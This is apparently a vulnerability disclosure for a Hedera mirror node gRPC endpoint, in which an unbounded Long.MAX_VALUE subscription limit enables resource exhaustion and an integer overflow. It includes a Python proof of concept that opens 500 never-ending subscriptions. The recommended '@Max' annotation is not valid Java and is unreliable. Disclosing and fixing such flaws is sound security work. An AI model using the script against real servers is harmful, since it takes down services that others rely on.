### Title
Unbounded Subscription via `Long.MAX_VALUE` Limit Bypasses Self-Termination in `ConsensusController.toFilter()`

### Summary
An unprivileged gRPC client can set `limit = Long.MAX_VALUE` in a `ConsensusTopicQuery`. This value passes the `@Min(0)` validation on `TopicMessageFilter.limit`, causes `hasLimit()` to return `true` (deceiving the service into believing a finite limit is set), yet `flux.take(Long.MAX_VALUE)` never self-terminates in practice. Without an `endTime`, the subscription holds a live polling database listener indefinitely, and additionally triggers a `long`-to-`int` overflow in `PollingTopicListener.poll()` producing a negative page size of `-1`.

### Finding Description

**Code path and root cause:**

`ConsensusController.toFilter()` blindly copies the protobuf `limit` field (int64) into the filter with no upper-bound check:

```java
// ConsensusController.java:56
final var filter = TopicMessageFilter.builder().limit(query.getLimit());
```

`TopicMessageFilter` only enforces `@Min(0)`:

```java
// TopicMessageFilter.java:25-26
@Min(0)
private long limit;
```

`Long.MAX_VALUE` satisfies `>= 0`, so validation passes. `hasLimit()` then returns `true`:

```java
// TopicMessageFilter.java:39-41
public boolean hasLimit() {
    return limit > 0;  // Long.MAX_VALUE > 0 == true
}
```

`TopicMessageServiceImpl.subscribeTopic()` applies `flux.take(filter.getLimit())`:

```java
// TopicMessageServiceImpl.java:83-85
if (filter.hasLimit()) {
    flux = flux.take(filter.getLimit()); // take(Long.MAX_VALUE) — never completes
}
```

Without `endTime`, `pastEndTime()` returns `Flux.never()`, so no external termination signal fires:

```java
// TopicMessageServiceImpl.java:123-125
private Flux<Object> pastEndTime(TopicContext topicContext) {
    if (topicContext.getFilter().getEndTime() == null) {
        return Flux.never();
    }
```

The live listener path in `incomingMessages()` propagates `Long.MAX_VALUE - count` as the new limit:

```java
// TopicMessageServiceImpl.java:115-116
long limit = filter.hasLimit() ? filter.getLimit() - topicContext.getCount().get() : 0;
```

This reaches `PollingTopicListener.poll()` where a `long`→`int` narrowing cast overflows:

```java
// PollingTopicListener.java:54-57
int limit = filter.hasLimit()
        ? (int) (filter.getLimit() - context.getCount().get())  // (int)Long.MAX_VALUE == -1
        : Integer.MAX_VALUE;
int pageSize = Math.min(limit, listenerProperties.getMaxPageSize()); // Math.min(-1, N) == -1
```

`pageSize = -1` is then passed to `topicMessageRepository.findByFilter(newFilter)`, causing undefined/erroneous DB query behavior. The outer `PollingTopicListener.listen()` repeats this poll `Long.MAX_VALUE` times:

```java
// PollingTopicListener.java:40-43
.repeatWhen(RepeatSpec.times(Long.MAX_VALUE)
        .jitter(0.1)
        .withFixedDelay(interval)
        .withScheduler(scheduler))
```

### Impact Explanation

Each such subscription holds a live reactive pipeline backed by a scheduled polling thread and repeated DB queries indefinitely. With no self-termination and no server-side connection limit enforced, an attacker opening many concurrent connections exhausts the bounded elastic scheduler thread pool, DB connection pool, and heap memory. This constitutes a practical Denial-of-Service against the mirror node's gRPC service. The integer overflow additionally causes malformed DB queries (`LIMIT -1`) whose behavior is driver/DB-dependent and may produce full table scans or errors that further degrade service.

### Likelihood Explanation

The gRPC endpoint is publicly reachable with no authentication required. The protobuf `ConsensusTopicQuery.limit` field is a plain `int64`; any gRPC client library can set it to `Long.MAX_VALUE` (or `9223372036854775807`) trivially. No special privileges, tokens, or knowledge of internal state are needed. The attack is repeatable and scriptable: open N connections with `limit = Long.MAX_VALUE` and no `endTime`, and walk away.

### Recommendation

1. **Add an upper-bound constraint** on `TopicMessageFilter.limit`:
   ```java
   @Min(0)
   @Max(Long value = 10_000L) // or a configurable property
   private long limit;
   ```
2. **Fix the narrowing cast** in `PollingTopicListener.poll()` — use `Math.min(filter.getLimit() - count, (long) listenerProperties.getMaxPageSize())` before casting to `int`, and clamp to `[1, maxPageSize]`.
3. **Enforce a server-side maximum concurrent subscriber count** (a configurable cap) and reject new subscriptions when the limit is reached.
4. **Require `endTime`** or enforce a maximum subscription duration for open-ended subscriptions.

### Proof of Concept

```python
import grpc
from com.hedera.mirror.api.proto import consensus_pb2, consensus_pb2_grpc
from com.hederahashgraph.api.proto.java import basic_types_pb2

channel = grpc.insecure_channel("mirror-node-grpc:5600")
stub = consensus_pb2_grpc.ConsensusServiceStub(channel)

query = consensus_pb2.ConsensusTopicQuery(
    topicID=basic_types_pb2.TopicID(topicNum=1),
    limit=9223372036854775807,  # Long.MAX_VALUE — passes @Min(0), hasLimit()=true
    # No consensusEndTime set → pastEndTime() returns Flux.never()
)

# Open many concurrent subscriptions
for _ in range(500):
    stub.subscribeTopic(query)  # each holds a live DB polling listener forever

# Server's bounded elastic scheduler, DB connection pool, and heap are exhausted.
```

**Observed result:** Each subscription enters `PollingTopicListener.listen()` with `RepeatSpec.times(Long.MAX_VALUE)`, polls the DB with `LIMIT -1` (overflow), never completes, and holds resources until the server OOMs or the thread pool is saturated.
